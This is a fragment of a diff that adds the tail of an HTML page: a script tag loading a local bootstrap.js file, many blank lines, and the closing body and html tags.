+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
